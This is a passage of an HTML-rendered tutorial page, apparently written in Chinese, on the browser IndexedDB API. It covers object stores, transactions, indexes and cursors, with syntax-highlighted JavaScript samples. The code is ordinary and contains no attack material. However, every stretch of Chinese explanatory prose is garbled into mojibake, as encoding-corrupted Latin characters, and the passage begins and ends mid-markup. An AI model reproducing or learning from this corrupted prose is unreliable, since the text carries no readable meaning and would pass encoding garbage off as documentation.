</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¸Šé¢ä»£ç å‘Šè¯‰ç´¢å¼•å¯¹è±¡ï¼Œ<code>name</code>å±æ€§ä¸æ˜¯å”¯ä¸€å€¼ï¼Œ<code>email</code>å±æ€§æ˜¯å”¯ä¸€å€¼ã€‚</p> <p><strong>ï¼ˆ12ï¼‰IDBObjectStore.deleteIndex()</strong></p> <p><code>IDBObjectStore.deleteIndex()</code>æ–¹æ³•ç”¨äºåˆ é™¤æŒ‡å®šçš„ç´¢å¼•ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>VersionChange</code>ç›‘å¬å‡½æ•°é‡Œé¢è°ƒç”¨ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">deleteIndex</span><span class="token punctuation">(</span>indexName<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>ï¼ˆ13ï¼‰IDBObjectStore.openCursor()</strong></p> <p><code>IDBObjectStore.openCursor()</code>ç”¨äºè·å–ä¸€ä¸ªæŒ‡é’ˆå¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>IDBObjectStore<span class="token punctuation">.</span><span class="token function">openCursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æŒ‡é’ˆå¯¹è±¡å¯ä»¥ç”¨æ¥éå†æ•°æ®ã€‚è¯¥å¯¹è±¡ä¹Ÿæ˜¯å¼‚æ­¥çš„ï¼Œæœ‰è‡ªå·±çš„<code>success</code>å’Œ<code>error</code>äº‹ä»¶ï¼Œå¯ä»¥å¯¹å®ƒä»¬æŒ‡å®šç›‘å¬å‡½æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> t <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> store <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> cursor <span class="token operator">=</span> store<span class="token punctuation">.</span><span class="token function">openCursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

cursor<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> res <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Key'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token string">'Data'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>ç›‘å¬å‡½æ•°æ¥å—ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¯¥å¯¹è±¡çš„<code>target.result</code>å±æ€§æŒ‡å‘å½“å‰æ•°æ®è®°å½•ã€‚è¯¥è®°å½•çš„<code>key</code>å’Œ<code>value</code>åˆ†åˆ«è¿”å›ä¸»é”®å’Œé”®å€¼ï¼ˆå³å®é™…å­˜å…¥çš„æ•°æ®ï¼‰ã€‚<code>continue()</code>æ–¹æ³•å°†å…‰æ ‡ç§»åˆ°ä¸‹ä¸€ä¸ªæ•°æ®å¯¹è±¡ï¼Œå¦‚æœå½“å‰æ•°æ®å¯¹è±¡å·²ç»æ˜¯æœ€åä¸€ä¸ªæ•°æ®äº†ï¼Œåˆ™å…‰æ ‡æŒ‡å‘<code>null</code>ã€‚</p> <p><code>openCursor()</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸»é”®å€¼ï¼Œæˆ–è€…ä¸€ä¸ª IDBKeyRange å¯¹è±¡ã€‚å¦‚æœæŒ‡å®šè¯¥å‚æ•°ï¼Œå°†åªå¤„ç†åŒ…å«æŒ‡å®šä¸»é”®çš„è®°å½•ï¼›å¦‚æœçœç•¥ï¼Œå°†å¤„ç†æ‰€æœ‰çš„è®°å½•ã€‚è¯¥æ–¹æ³•è¿˜å¯ä»¥æ¥å—ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¡¨ç¤ºéå†æ–¹å‘ï¼Œé»˜è®¤å€¼ä¸º<code>next</code>ï¼Œå…¶ä»–å¯èƒ½çš„å€¼ä¸º<code>prev</code>ã€<code>nextunique</code>å’Œ<code>prevunique</code>ã€‚åä¸¤ä¸ªå€¼è¡¨ç¤ºå¦‚æœé‡åˆ°é‡å¤å€¼ï¼Œä¼šè‡ªåŠ¨è·³è¿‡ã€‚</p> <p><strong>ï¼ˆ14ï¼‰IDBObjectStore.openKeyCursor()</strong></p> <p><code>IDBObjectStore.openKeyCursor()</code>ç”¨äºè·å–ä¸€ä¸ªä¸»é”®æŒ‡é’ˆå¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>IDBObjectStore<span class="token punctuation">.</span><span class="token function">openKeyCursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_8-idbtransaction-å¯¹è±¡"><a href="#_8-idbtransaction-å¯¹è±¡" class="header-anchor">#</a> 8.IDBTransaction å¯¹è±¡</h2> <p>IDBTransaction å¯¹è±¡ç”¨æ¥å¼‚æ­¥æ“ä½œæ•°æ®åº“äº‹åŠ¡ï¼Œæ‰€æœ‰çš„è¯»å†™æ“ä½œéƒ½è¦é€šè¿‡è¿™ä¸ªå¯¹è±¡è¿›è¡Œã€‚</p> <p><code>IDBDatabase.transaction()</code>æ–¹æ³•è¿”å›çš„å°±æ˜¯ä¸€ä¸ª IDBTransaction å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> db<span class="token punctuation">;</span>
<span class="token keyword">var</span> DBOpenRequest <span class="token operator">=</span> window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

DBOpenRequest<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db <span class="token operator">=</span> DBOpenRequest<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'demo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  transaction<span class="token punctuation">.</span><span class="token function-variable function">oncomplete</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'transaction success'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  transaction<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'transaction error: '</span> <span class="token operator">+</span> transaction<span class="token punctuation">.</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">var</span> objectStore <span class="token operator">=</span> transaction<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> objectStoreRequest <span class="token operator">=</span> objectStore<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> foo<span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  objectStoreRequest<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'add data success'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>äº‹åŠ¡çš„æ‰§è¡Œé¡ºåºæ˜¯æŒ‰ç…§åˆ›å»ºçš„é¡ºåºï¼Œè€Œä¸æ˜¯å‘å‡ºè¯·æ±‚çš„é¡ºåºã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> trans1 <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> trans2 <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> objectStore2 <span class="token operator">=</span> trans2<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> objectStore1 <span class="token operator">=</span> trans1<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span>
objectStore2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
objectStore1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>key</code>å¯¹åº”çš„é”®å€¼æœ€ç»ˆæ˜¯<code>2</code>ï¼Œè€Œä¸æ˜¯<code>1</code>ã€‚å› ä¸ºäº‹åŠ¡<code>trans1</code>å…ˆäº<code>trans2</code>åˆ›å»ºï¼Œæ‰€ä»¥é¦–å…ˆæ‰§è¡Œã€‚</p> <p>æ³¨æ„ï¼Œäº‹åŠ¡æœ‰å¯èƒ½å¤±è´¥ï¼Œåªæœ‰ç›‘å¬åˆ°äº‹åŠ¡çš„<code>complete</code>äº‹ä»¶ï¼Œæ‰èƒ½ä¿è¯äº‹åŠ¡æ“ä½œæˆåŠŸã€‚</p> <p>IDBTransaction å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p> <ul><li><code>IDBTransaction.db</code>ï¼šè¿”å›å½“å‰äº‹åŠ¡æ‰€åœ¨çš„æ•°æ®åº“å¯¹è±¡ IDBDatabaseã€‚</li> <li><code>IDBTransaction.error</code>ï¼šè¿”å›å½“å‰äº‹åŠ¡çš„é”™è¯¯ã€‚å¦‚æœäº‹åŠ¡æ²¡æœ‰ç»“æŸï¼Œæˆ–è€…äº‹åŠ¡æˆåŠŸç»“æŸï¼Œæˆ–è€…è¢«æ‰‹åŠ¨ç»ˆæ­¢ï¼Œè¯¥æ–¹æ³•è¿”å›<code>null</code>ã€‚</li> <li><code>IDBTransaction.mode</code>ï¼šè¿”å›å½“å‰äº‹åŠ¡çš„æ¨¡å¼ï¼Œé»˜è®¤æ˜¯<code>readonly</code>ï¼ˆåªè¯»ï¼‰ï¼Œå¦ä¸€ä¸ªå€¼æ˜¯<code>readwrite</code>ã€‚</li> <li><code>IDBTransaction.objectStoreNames</code>ï¼šè¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ DOMStringListï¼Œæˆå‘˜æ˜¯å½“å‰äº‹åŠ¡æ¶‰åŠçš„å¯¹è±¡ä»“åº“çš„åå­—ã€‚</li> <li><code>IDBTransaction.onabort</code>ï¼šæŒ‡å®š<code>abort</code>äº‹ä»¶ï¼ˆäº‹åŠ¡ä¸­æ–­ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>IDBTransaction.oncomplete</code>ï¼šæŒ‡å®š<code>complete</code>äº‹ä»¶ï¼ˆäº‹åŠ¡æˆåŠŸï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>IDBTransaction.onerror</code>ï¼šæŒ‡å®š<code>error</code>äº‹ä»¶ï¼ˆäº‹åŠ¡å¤±è´¥ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li></ul> <p>IDBTransaction å¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ã€‚</p> <ul><li><code>IDBTransaction.abort()</code>ï¼šç»ˆæ­¢å½“å‰äº‹åŠ¡ï¼Œå›æ»šæ‰€æœ‰å·²ç»è¿›è¡Œçš„å˜æ›´ã€‚</li> <li><code>IDBTransaction.objectStore(name)</code>ï¼šè¿”å›æŒ‡å®šåç§°çš„å¯¹è±¡ä»“åº“ IDBObjectStoreã€‚</li></ul> <h2 id="_9-idbindex-å¯¹è±¡"><a href="#_9-idbindex-å¯¹è±¡" class="header-anchor">#</a> 9.IDBIndex å¯¹è±¡</h2> <p>IDBIndex å¯¹è±¡ä»£è¡¨æ•°æ®åº“çš„ç´¢å¼•ï¼Œé€šè¿‡è¿™ä¸ªå¯¹è±¡å¯ä»¥è·å–æ•°æ®åº“é‡Œé¢çš„è®°å½•ã€‚æ•°æ®è®°å½•çš„ä¸»é”®é»˜è®¤å°±æ˜¯å¸¦æœ‰ç´¢å¼•ï¼ŒIDBIndex å¯¹è±¡ä¸»è¦ç”¨äºé€šè¿‡é™¤ä¸»é”®ä»¥å¤–çš„å…¶ä»–é”®ï¼Œå»ºç«‹ç´¢å¼•è·å–å¯¹è±¡ã€‚</p> <p>IDBIndex æ˜¯æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨ã€‚åªè¦æ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤æ•°æ®è®°å½•ï¼Œå¼•ç”¨çš„å¯¹è±¡åº“ä¸­çš„è®°å½•ï¼Œç´¢å¼•å°±ä¼šè‡ªåŠ¨æ›´æ–°ã€‚</p> <p><code>IDBObjectStore.index()</code>æ–¹æ³•å¯ä»¥è·å– IDBIndex å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'contactsList'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> objectStore <span class="token operator">=</span> transaction<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'contactsList'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> myIndex <span class="token operator">=</span> objectStore<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">'lName'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

myIndex<span class="token punctuation">.</span><span class="token function">openCursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> cursor <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cursor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> tableRow <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    tableRow<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span>   <span class="token string">'&lt;td&gt;'</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span>
                         <span class="token operator">+</span> <span class="token string">'&lt;td&gt;'</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>lName <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span>
                         <span class="token operator">+</span> <span class="token string">'&lt;td&gt;'</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>fName <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span>
                         <span class="token operator">+</span> <span class="token string">'&lt;td&gt;'</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>jTitle <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span>
                         <span class="token operator">+</span> <span class="token string">'&lt;td&gt;'</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>company <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span>
                         <span class="token operator">+</span> <span class="token string">'&lt;td&gt;'</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>eMail <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span>
                         <span class="token operator">+</span> <span class="token string">'&lt;td&gt;'</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>phone <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span>
                         <span class="token operator">+</span> <span class="token string">'&lt;td&gt;'</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token string">'&lt;/td&gt;'</span><span class="token punctuation">;</span>
    tableEntry<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>tableRow<span class="token punctuation">)</span><span class="token punctuation">;</span>

    cursor<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Entries all displayed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>IDBIndex å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p> <ul><li><code>IDBIndex.name</code>ï¼šå­—ç¬¦ä¸²ï¼Œç´¢å¼•çš„åç§°ã€‚</li> <li><code>IDBIndex.objectStore</code>ï¼šç´¢å¼•æ‰€åœ¨çš„å¯¹è±¡ä»“åº“ã€‚</li> <li><code>IDBIndex.keyPath</code>ï¼šç´¢å¼•çš„ä¸»é”®ã€‚</li> <li><code>IDBIndex.multiEntry</code>ï¼šå¸ƒå°”å€¼ï¼Œé’ˆå¯¹<code>keyPath</code>ä¸ºæ•°ç»„çš„æƒ…å†µï¼Œå¦‚æœè®¾ä¸º<code>true</code>ï¼Œåˆ›å»ºæ•°ç»„æ—¶ï¼Œæ¯ä¸ªæ•°ç»„æˆå‘˜éƒ½ä¼šæœ‰ä¸€ä¸ªæ¡ç›®ï¼Œå¦åˆ™æ¯ä¸ªæ•°ç»„éƒ½åªæœ‰ä¸€ä¸ªæ¡ç›®ã€‚</li> <li><code>IDBIndex.unique</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºåˆ›å»ºç´¢å¼•æ—¶æ˜¯å¦å…è®¸ç›¸åŒçš„ä¸»é”®ã€‚</li></ul> <p>IDBIndex å¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ï¼Œå®ƒä»¬éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œç«‹å³è¿”å›çš„éƒ½æ˜¯ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <ul><li><code>IDBIndex.count()</code>ï¼šç”¨æ¥è·å–è®°å½•çš„æ•°é‡ã€‚å®ƒå¯ä»¥æ¥å—ä¸»é”®æˆ– IDBKeyRange å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¿™æ—¶åªè¿”å›ç¬¦åˆä¸»é”®çš„è®°å½•æ•°é‡ï¼Œå¦åˆ™è¿”å›æ‰€æœ‰è®°å½•çš„æ•°é‡ã€‚</li> <li><code>IDBIndex.get(key)</code>ï¼šç”¨æ¥è·å–ç¬¦åˆæŒ‡å®šä¸»é”®çš„æ•°æ®è®°å½•ã€‚</li> <li><code>IDBIndex.getKey(key)</code>ï¼šç”¨æ¥è·å–æŒ‡å®šçš„ä¸»é”®ã€‚</li> <li><code>IDBIndex.getAll()</code>ï¼šç”¨æ¥è·å–æ‰€æœ‰çš„æ•°æ®è®°å½•ã€‚å®ƒå¯ä»¥æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œéƒ½æ˜¯å¯é€‰çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç”¨æ¥æŒ‡å®šä¸»é”®ï¼Œç¬¬äºŒä¸ªå‚æ•°ç”¨æ¥æŒ‡å®šè¿”å›è®°å½•çš„æ•°é‡ã€‚å¦‚æœçœç•¥è¿™ä¸¤ä¸ªå‚æ•°ï¼Œåˆ™è¿”å›æ‰€æœ‰è®°å½•ã€‚ç”±äºè·å–æˆåŠŸæ—¶ï¼Œæµè§ˆå™¨å¿…é¡»ç”Ÿæˆæ‰€æœ‰å¯¹è±¡ï¼Œæ‰€ä»¥å¯¹æ€§èƒ½æœ‰å½±å“ã€‚å¦‚æœæ•°æ®é›†æ¯”è¾ƒå¤§ï¼Œå»ºè®®ä½¿ç”¨ IDBCursor å¯¹è±¡ã€‚</li> <li><code>IDBIndex.getAllKeys()</code>ï¼šè¯¥æ–¹æ³•ä¸<code>IDBIndex.getAll()</code>æ–¹æ³•ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯è·å–æ‰€æœ‰ä¸»é”®ã€‚</li> <li><code>IDBIndex.openCursor()</code>ï¼šç”¨æ¥è·å–ä¸€ä¸ª IDBCursor å¯¹è±¡ï¼Œç”¨æ¥éå†ç´¢å¼•é‡Œé¢çš„æ‰€æœ‰æ¡ç›®ã€‚</li> <li><code>IDBIndex.openKeyCursor()</code>ï¼šè¯¥æ–¹æ³•ä¸<code>IDBIndex.openCursor()</code>æ–¹æ³•ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯éå†æ‰€æœ‰æ¡ç›®çš„ä¸»é”®ã€‚</li></ul> <h2 id="_10-idbcursor-å¯¹è±¡"><a href="#_10-idbcursor-å¯¹è±¡" class="header-anchor">#</a> 10.IDBCursor å¯¹è±¡</h2> <p>IDBCursor å¯¹è±¡ä»£è¡¨æŒ‡é’ˆå¯¹è±¡ï¼Œç”¨æ¥éå†æ•°æ®ä»“åº“ï¼ˆIDBObjectStoreï¼‰æˆ–ç´¢å¼•ï¼ˆIDBIndexï¼‰çš„è®°å½•ã€‚</p> <p>IDBCursor å¯¹è±¡ä¸€èˆ¬é€šè¿‡<code>IDBObjectStore.openCursor()</code>æ–¹æ³•è·å¾—ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'rushAlbumList'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> objectStore <span class="token operator">=</span> transaction<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'rushAlbumList'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

objectStore<span class="token punctuation">.</span><span class="token function">openCursor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> cursor <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cursor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> listItem <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      listItem<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>albumTitle <span class="token operator">+</span> <span class="token string">', '</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>year<span class="token punctuation">;</span>
      list<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>listItem<span class="token punctuation">)</span><span class="token punctuation">;</span>

      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cursor<span class="token punctuation">.</span>source<span class="token punctuation">)</span><span class="token punctuation">;</span>
      cursor<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Entries all displayed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
